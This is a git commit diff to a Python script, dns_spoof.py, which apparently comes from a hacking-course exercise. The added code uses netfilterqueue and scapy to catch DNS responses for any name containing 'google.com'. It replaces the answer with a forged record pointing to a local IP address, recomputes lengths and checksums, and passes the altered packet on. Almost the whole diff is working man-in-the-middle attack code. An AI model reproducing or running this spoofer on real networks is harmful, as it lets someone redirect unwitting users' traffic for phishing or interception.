7b7e8c059ea0dbc166e33116b2ae37e10e085165
em0ji <rowi.xyz@gmail.com>
2021-10-14 19:07:26 +0300

    modified dns_spoof.py

--- dns_spoof/dns_spoof.py
+++ dns_spoof/dns_spoof.py
@@ -1,11 +1,25 @@
 #!usr/bin/env python
+#coding: utf8
 import netfilterqueue
 import scapy.all as scapy
 
 def process_packet(packet):
 	scapy_packet = scapy.IP(packet.get_payload())
 	if scapy_packet.haslayer(scapy.DNSRR):
-		print(scapy_packet.show())
+		qname = scapy_packet[scapy.DNSQR].qname
+		if "google.com" in qname:
+			print("[+] Цель обнаружена")
+			answer = scapy.DNSRR(rrname=qname, rdata="***.168.31.254")
+			scapy_packet[scapy.DNS].an = answer 
+			scapy_packet[scapy.DNS].ancount = 1
+
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].chksum
+			del scapy_packet[scapy.UDP].len
+
+			packet.set_payload(str(scapy_packet))
+
 	packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
